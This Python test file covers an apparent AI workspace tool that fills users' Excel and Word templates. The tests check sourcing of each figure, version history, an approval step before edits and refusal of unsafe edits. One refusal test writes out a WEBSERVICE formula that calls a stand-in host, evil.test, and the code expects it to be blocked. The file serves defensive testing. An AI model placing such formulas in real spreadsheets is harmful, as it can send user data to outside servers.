"""The user's own Excel and Word files: attach, inspect, edit with sources, versions, refusals."""

from __future__ import annotations

import io
import unittest

from .helpers import Harness


def template_xlsx() -> bytes:
    from openpyxl import Workbook
    from openpyxl.styles import Font

    wb = Workbook()
    ws = wb.active
    ws.title = "Pack"
    ws["A1"] = "Monthly pack"
    ws["A1"].font = Font(bold=True, size=14)
    ws.append([])
    ws.append(["Line", "October", "Budget", "Variance"])
    ws.append(["Revenue", None, 120000, "=B4-C4"])
    ws.append(["Payroll", None, 52000, "=B5-C5"])
    ws["B4"].number_format = "#,##0.00"
    buf = io.BytesIO()
    wb.save(buf)
    return buf.getvalue()


def template_docx() -> bytes:
    from docx import Document

    d = Document()
    d.add_heading("Engagement letter", 1)
    p = d.add_paragraph("Dear ")
    p.add_run("{{client")  # a placeholder split across runs, as Word often saves it
    p.add_run("_name}},")
    d.add_paragraph("Our fee for the year is {{fee}}.")
    t = d.add_table(rows=2, cols=2)
    t.cell(0, 0).text = "Item"
    t.cell(0, 1).text = "Amount"
    t.cell(1, 0).text = "Audit fee"
    buf = io.BytesIO()
    d.save(buf)
    return buf.getvalue()


class UserFiles(unittest.TestCase):
    def setUp(self) -> None:
        self.h = Harness()
        self.ws = self.h.setup_workspace()

    def tearDown(self) -> None:
        self.h.close()

    def download(self, fid: str, fmt: str, version: int | None = None) -> bytes:
        params = {"format": fmt} | ({"version": version} if version else {})
        r = self.h.client.get(f"/api/w/{self.ws}/files/{fid}/download", params=params)
        self.assertEqual(r.status_code, 200, r.text)
        return r.content

    def test_attached_workbook_is_filled_with_sources(self) -> None:
        h, ws = self.h, self.ws
        up = h.api("POST", f"/api/w/{ws}/documents", data={"purpose": "chat"},
                   files=[("files", ("October pack.xlsx", template_xlsx()))])
        doc = up["added"][0]
        h.client.portal.call(h.engine.knowledge.wait_idle)
        t = h.api("POST", f"/api/w/{ws}/threads", json={})
        h.llm.script = [[("open_file_for_editing", {"document_id": doc["id"]})], "It is open."]
        h.api("POST", f"/api/w/{ws}/threads/{t['id']}/messages",
              json={"text": "Fill my pack: October revenue was 125,400.50", "attachments": [doc["id"]]})
        h.wait_run(t["id"])
        self.assertIn("open_file_for_editing", h.llm.calls[0]["messages"][-1]["content"])  # attachment hint
        files = h.api("GET", f"/api/w/{ws}/files")
        self.assertEqual(len(files), 1)
        fid = files[0]["id"]
        self.assertEqual(files[0]["kind"], "user_xlsx")
        h.llm.script = [[("inspect_file", {"file_id": fid, "sheet": "Pack"})],
                        [("edit_file", {"file_id": fid, "note": "October actuals", "edits": [
                            {"op": "set_cell", "sheet": "Pack", "cell": "B4", "value": 125400.5},
                            {"op": "set_cell", "sheet": "Pack", "cell": "B5", "value": 53875},
                            {"op": "append_row", "sheet": "Pack", "values": ["Total", "=SUM(B4:B5)", "=SUM(C4:C5)",
                                                                              "=B6-C6"]}]})],
                        "Filled; payroll 53,875 has no source."]
        h.api("POST", f"/api/w/{ws}/threads/{t['id']}/messages", json={"text": "Go ahead"})
        data = h.wait_run(t["id"])
        # editing a person's own file changes something they keep: it waits for approval (audit OB-08)
        self.assertEqual(data["run"]["status"], "waiting_approval")
        self.assertEqual(h.api("GET", f"/api/w/{ws}/files/{fid}")["version"], 1)   # nothing changed yet
        pending = h.api("GET", f"/api/w/{ws}/approvals")
        self.assertEqual([a["tool"] for a in pending], ["edit_file"])
        self.assertEqual(pending[0]["summary"], "Edit file (3 changes)")
        h.api("POST", f"/api/w/{ws}/approvals/{pending[0]['id']}/decide", json={"approve": True})
        data = h.wait_run(t["id"])
        tools = [m for m in data["messages"] if m["role"] == "tool"]
        self.assertIn("B4=", tools[-2]["content"].replace(" ", "") + "B4=")  # inspect listed cells
        self.assertIn("D4==B4-C4", tools[-2]["content"].replace(" ", ""))
        self.assertIn("1 figure(s) traced to a source", tools[-1]["content"])
        self.assertIn("53875 has NO source", tools[-1]["content"])
        out = h.api("GET", f"/api/w/{ws}/files/{fid}")
        self.assertEqual(out["version"], 2)
        self.assertEqual([v["version"] for v in out["versions"]], [2, 1])
        self.assertEqual([f["target"] for f in out["findings"]], ["Pack!B5"])
        b4 = next(e for e in out["model"]["edits"] if e["target"] == "Pack!B4")
        self.assertEqual(b4["status"], "sourced")
        self.assertIn("Stated by", b4["source"])

        from openpyxl import load_workbook

        wb = load_workbook(io.BytesIO(self.download(fid, "xlsx")))
        s = wb["Pack"]
        self.assertEqual(s["B4"].value, 125400.5)
        self.assertEqual(s["B4"].number_format, "#,##0.00")  # the user's formatting is kept
        self.assertTrue(s["A1"].font.bold)
        self.assertEqual(s["D4"].value, "=B4-C4")
        self.assertEqual(s["B6"].value, "=SUM(B4:B5)")
        self.assertIn("Source:", s["B4"].comment.text)
        self.assertEqual(s["B5"].fill.fgColor.rgb[-6:], "FFF4CC")
        original = load_workbook(io.BytesIO(self.download(fid, "xlsx", 1)))
        self.assertIsNone(original["Pack"]["B4"].value)  # version 1 is the untouched original
        # opening the same attachment again reuses the file
        h.llm.script = [[("open_file_for_editing", {"document_id": doc["id"]})], "ok"]
        h.api("POST", f"/api/w/{ws}/threads/{t['id']}/messages", json={"text": "open it again"})
        h.wait_run(t["id"])
        self.assertEqual(len(h.api("GET", f"/api/w/{ws}/files")), 1)

    def test_word_template_and_refusals(self) -> None:
        h, ws = self.h, self.ws
        r = h.client.post(f"/api/w/{ws}/files/upload", files={"file": ("Letter.docx", template_docx())})
        self.assertEqual(r.status_code, 200, r.text)
        out = r.json()
        fid = out["file"]["id"]
        self.assertEqual(out["model"]["outline"]["placeholders"], ["{{client_name}}", "{{fee}}"])
        text = h.api("GET", f"/api/w/{ws}/files/{fid}/inspect")["text"]
        self.assertIn("Placeholders to fill", text)
        self.assertIn("T0", text)
        out = h.api("POST", f"/api/w/{ws}/files/{fid}/edit", json={"edits": [
            {"op": "fill", "values": {"client_name": "Gulf Freight LLC", "fee": "SAR 48,500"}},
            {"op": "set_table_cell", "table": 0, "row": 1, "column": 1, "text": "48,500"},
            {"op": "insert_paragraph", "after": 2, "text": "Payment is due within 30 days."}]})
        self.assertEqual(out["model"]["summary"]["unverified"], 2)  # no conversation: the fee has no source
        from docx import Document

        d = Document(io.BytesIO(self.download(fid, "docx")))
        body = "\n".join(p.text for p in d.paragraphs)
        self.assertIn("Dear Gulf Freight LLC,", body)
        self.assertIn("Our fee for the year is SAR 48,500.", body)
        self.assertEqual([p.text for p in d.paragraphs].index("Payment is due within 30 days."), 3)
        self.assertEqual(d.tables[0].cell(1, 1).text, "48,500")
        self.assertTrue(any(r.font.highlight_color for p in d.paragraphs for r in p.runs if "48,500" in r.text))
        # refusals
        e = h.api("POST", f"/api/w/{ws}/files/{fid}/edit", json={"edits": [{"op": "fill", "values": {"nope": "x"}}]},
                  expect=422)
        self.assertIn("does not appear", e["message"])
        x = h.client.post(f"/api/w/{ws}/files/upload", files={"file": ("Pack.xlsx", template_xlsx())}).json()
        e = h.api("POST", f"/api/w/{ws}/files/{x['file']['id']}/edit", expect=422, json={"edits": [
            {"op": "set_cell", "cell": "E1", "formula": "=WEBSERVICE(\"https://evil.test\")"}]})
        self.assertEqual(e["error"], "formula_refused")
        e = h.api("POST", f"/api/w/{ws}/files/{x['file']['id']}/edit", expect=422, json={"edits": [
            {"op": "set_cell", "cell": "E1", "formula": "='[other.xlsx]Sheet1'!A1"}]})
        self.assertEqual(e["error"], "formula_refused")
        r = h.client.post(f"/api/w/{ws}/files/upload", files={"file": ("macro.xlsm", b"PK..")})
        self.assertEqual(r.status_code, 422)
        self.assertEqual(h.client.post(f"/api/w/{ws}/files/{fid}/refresh").status_code, 422)
        self.assertEqual(h.client.post(f"/api/w/{ws}/files/{fid}/review").status_code, 422)


if __name__ == "__main__":
    unittest.main()
